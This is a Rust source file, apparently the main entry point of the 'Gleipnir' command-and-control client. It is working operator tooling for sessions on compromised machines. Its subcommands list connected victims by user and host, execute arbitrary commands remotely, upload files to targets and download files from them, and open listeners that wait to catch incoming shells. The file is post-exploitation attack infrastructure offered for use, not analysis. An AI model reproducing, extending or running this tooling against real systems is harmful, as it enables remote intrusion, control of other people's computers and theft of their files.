mod client;

use clap::{Parser, Subcommand};

#[derive(Parser)]
#[command(name = "gleipnir", about = "Gleipnir C2 client")]
struct Cli {
    #[arg(long, default_value = "http://localhost:6666", global = true)]
    server: String,

    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// List active sessions
    Sessions,
    /// Execute a command on a session
    Exec {
        session: String,
        command: String,
        #[arg(short, long, default_value_t = 300)]
        timeout: u64,
    },
    /// Create a new listener
    Listen {
        port: u16,
        #[arg(short, long, default_value = "agent")]
        mode: String,
    },
    /// List active listeners
    Listeners,
    /// Show server info
    Info,
    /// Upload a local file to a session target
    Upload {
        session: String,
        local_path: String,
        remote_path: String,
    },
    /// Download a file from a session target
    Download {
        session: String,
        remote_path: String,
        /// Local path to save to (defaults to filename from remote_path)
        local_path: Option<String>,
    },
    /// Kill a session
    Kill { session: String },
    /// Close a listener
    Close { id: String },
    /// Start embedded server, catch first connection, interactive shell
    Catch {
        port: u16,
        #[arg(short, long, default_value = "raw")]
        mode: String,
    },
}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();
    let c = client::Client::new(&cli.server);

    match cli.command {
        Commands::Sessions => match c.get("/api/sessions").await {
            Ok(v) => print_json(&v),
            Err(e) => eprintln!("error: {e}"),
        },
        Commands::Exec {
            session,
            command,
            timeout,
        } => {
            let body = serde_json::json!({ "command": command, "timeout": timeout });
            match c
                .post(&format!("/api/sessions/{session}/exec"), &body)
                .await
            {
                Ok(v) => {
                    if let Some(output) = v.get("output").and_then(|v| v.as_str()) {
                        println!("{output}");
                    } else {
                        print_json(&v);
                    }
                }
                Err(e) => eprintln!("error: {e}"),
            }
        }
        Commands::Listen { port, mode } => {
            let body = serde_json::json!({ "port": port, "mode": mode });
            match c.post("/api/listeners", &body).await {
                Ok(v) => print_json(&v),
                Err(e) => eprintln!("error: {e}"),
            }
        }
        Commands::Listeners => match c.get("/api/listeners").await {
            Ok(v) => print_json(&v),
            Err(e) => eprintln!("error: {e}"),
        },
        Commands::Info => match c.get("/api/info").await {
            Ok(v) => print_json(&v),
            Err(e) => eprintln!("error: {e}"),
        },
        Commands::Upload {
            session,
            local_path,
            remote_path,
        } => {
            let data = match std::fs::read(&local_path) {
                Ok(d) => d,
                Err(e) => {
                    eprintln!("error: failed to read {local_path}: {e}");
                    std::process::exit(1);
                }
            };
            use base64::Engine;
            let b64 = base64::engine::general_purpose::STANDARD.encode(&data);
            let body = serde_json::json!({
                "data_b64": b64,
                "dst_path": remote_path,
            });
            match c
                .post(&format!("/api/sessions/{session}/upload"), &body)
                .await
            {
                Ok(v) => print_json(&v),
                Err(e) => eprintln!("error: {e}"),
            }
        }
        Commands::Download {
            session,
            remote_path,
            local_path,
        } => {
            let body = serde_json::json!({ "remote_path": remote_path });
            match c
                .post(&format!("/api/sessions/{session}/download"), &body)
                .await
            {
                Ok(v) => {
                    let Some(b64) = v.get("data_b64").and_then(|v| v.as_str()) else {
                        eprintln!("error: no data_b64 in response");
                        print_json(&v);
                        std::process::exit(1);
                    };
                    use base64::Engine;
                    let data = match base64::engine::general_purpose::STANDARD.decode(b64) {
                        Ok(d) => d,
                        Err(e) => {
                            eprintln!("error: invalid base64: {e}");
                            std::process::exit(1);
                        }
                    };
                    let save_path = local_path.unwrap_or_else(|| {
                        std::path::Path::new(&remote_path)
                            .file_name()
                            .map(|f| f.to_string_lossy().to_string())
                            .unwrap_or_else(|| "download".to_string())
                    });
                    match std::fs::write(&save_path, &data) {
                        Ok(()) => {
                            eprintln!("[+] saved {} bytes to {save_path}", data.len());
                        }
                        Err(e) => eprintln!("error: failed to write {save_path}: {e}"),
                    }
                }
                Err(e) => eprintln!("error: {e}"),
            }
        }
        Commands::Kill { session } => match c.delete(&format!("/api/sessions/{session}")).await {
            Ok(v) => print_json(&v),
            Err(e) => eprintln!("error: {e}"),
        },
        Commands::Close { id } => match c.delete(&format!("/api/listeners/{id}")).await {
            Ok(v) => print_json(&v),
            Err(e) => eprintln!("error: {e}"),
        },
        Commands::Catch { port, mode } => {
            // Requires a running gleipnir-server. Creates a listener and waits for a connection.
            // Full embedded mode (built-in server) is a future enhancement.
            let body = serde_json::json!({ "port": port, "mode": mode });
            match c.post("/api/listeners", &body).await {
                Ok(v) => {
                    eprintln!(
                        "[+] Listener created: {}",
                        serde_json::to_string_pretty(&v).unwrap_or_default()
                    );
                    eprintln!("[*] Waiting for connection... (Ctrl+C to stop)");
                    loop {
                        tokio::time::sleep(std::time::Duration::from_secs(2)).await;
                        if let Ok(sessions) = c.get("/api/sessions").await
                            && let Some(arr) = sessions.as_array()
                        {
                            let connected: Vec<_> = arr
                                .iter()
                                .filter(|s| {
                                    s.get("connected")
                                        .and_then(|v| v.as_bool())
                                        .unwrap_or(false)
                                })
                                .collect();
                            if !connected.is_empty() {
                                eprintln!("[+] Session(s) connected!");
                                for s in connected {
                                    let name =
                                        s.get("name").and_then(|v| v.as_str()).unwrap_or("?");
                                    let user =
                                        s.get("username").and_then(|v| v.as_str()).unwrap_or("?");
                                    let host =
                                        s.get("hostname").and_then(|v| v.as_str()).unwrap_or("?");
                                    eprintln!("    {name}: {user}@{host}");
                                }
                                break;
                            }
                        }
                    }
                }
                Err(e) => eprintln!("error: {e}"),
            }
        }
    }
}

fn print_json(v: &serde_json::Value) {
    println!("{}", serde_json::to_string_pretty(v).unwrap_or_default());
}
